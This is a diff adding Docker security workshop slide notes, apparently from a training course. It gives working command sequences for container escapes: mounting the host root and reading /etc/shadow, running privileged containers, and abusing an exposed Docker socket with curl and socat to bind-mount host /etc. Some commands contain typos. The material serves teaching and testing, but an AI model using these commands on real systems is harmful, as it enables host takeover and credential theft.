@@ -378,4 +378,111 @@ docker events
 >sudo ctr --address /var/run/containerd/containerd.sock events
 >```
 
-### Slide 55 - 
+### Slide 55 - Working with external data / using Docker in your offensive toolkit
+
+```
+docker run --rm -it instrumentisto/nmap -A -T4 scanme.nmap.org
+```
+
+Where's the output? (optional)
+```
+mkdir ~/vol_test && cd ~/vol_test/
+```
+```
+docker run -v ~/vol_test:/output instrumentisto/nmap -sT -oA /output/test scanme.nmap.org 
+```
+```
+ls -l ~/vol_test
+```
+```
+cat test.nmap
+```
+
+### Slide 57 - Docker with root or etc mounted as volume
+
+```
+docker run -it -v /:/host alpine /bin/ash
+```
+```
+cat /host/etc/shadow
+```
+```
+exit
+```
+
+### Slide 58 - Docker running privileged containers
+
+```
+docker run -it --privileged ubuntu /bin/bash
+```
+```
+apt update && apt-get install -y libcap2-bin
+```
+```
+capsh --prunt
+```
+```
+grep Cap /proc/self/status
+```
+```
+capsh --decode=0000003fffffffff
+```
+```
+exit
+```
+
+### Slide 59 - Exercise: Docker socket exposed in container
+
+```
+docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/dash
+```
+
+```
+cd var/run/ && ls -l
+```
+
+```
+apt update && apt install -y curl socat
+```
+
+```
+echo '{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/etc/","Target":"/host_etc"}]}' > container.json
+```
+
+```
+curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "$(cat container.json)" http://localhost/containers/create
+```
+Make note of the first 4-5 characters of the ID returned, you'll need it in the next command.
+```
+curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<id 4-5 first chars>/start
+```
+
+### Slide 60 - Exposed docker socket hijinx (cont.)
+
+```
+socat - UNIX-CONNECT:/var/run/docker.sock
+```
+Make sure you do this carefully and be sure to put the container id in the POST url
+```
+POST /containers/<id-first-5-chars>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
+Host:
+Connection: Upgrade
+Upgrade: tcp
+
+
+```
+After hitting enter twice, the socket should return an http status indicating the connection was upgraded.
+```
+ls
+```
+```
+cat /host_etc/shadow
+```
+
+### Slide 61 - Docker persistence
+
+```
+docker run --restart nginx
+```
+
+
